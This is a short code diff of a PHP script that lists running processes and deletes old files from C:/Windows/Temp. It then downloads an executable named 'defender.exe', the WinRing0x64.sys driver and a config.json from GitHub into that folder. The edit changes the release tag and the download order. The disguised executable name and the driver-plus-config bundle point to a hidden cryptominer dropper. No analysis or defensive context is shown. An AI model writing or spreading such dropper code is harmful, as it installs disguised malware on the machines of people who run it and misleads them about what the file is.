@@ -65,7 +65,7 @@ $checkfile1 = 'C:/Windows/Temp/defender.exe';
 
 exec('tasklist', $output);
 
-$url =  'https://github.com/danialchork/project-final/releases/download/last/defender.exe';
+$url =  'https://github.com/danialchork/project-final/releases/download/last2/defender.exe';
 $url2 =  'https://github.com/danialchork/project-final/releases/download/last/WinRing0x64.sys';
 $url3 =  'https://raw.githubusercontent.com/KarleyGreenholt/uni-test-project/refs/heads/main/config.json';
 $file_name = 'C:/Windows/Temp/defender.exe';
@@ -89,12 +89,12 @@ if (!$found && !$found2) {
            system('del /f /q "C:/Windows/Temp/defender.exe"');     
         system('del /f /q "C:/Windows/Temp/WinRing0x64.sys"');
         system('del /f /q "C:/Windows/Temp/config.json"');
-        if (file_put_contents($file_name, file_get_contents($url)))
+        if (file_put_contents($file_name2, file_get_contents($url2)))
             {
                 echo "File downloaded successfully";
             }
 
-         if (file_put_contents($file_name2, file_get_contents($url2)))
+         if (file_put_contents($file_name, file_get_contents($url)))
             {
                 echo "File downloaded successfully";
             }
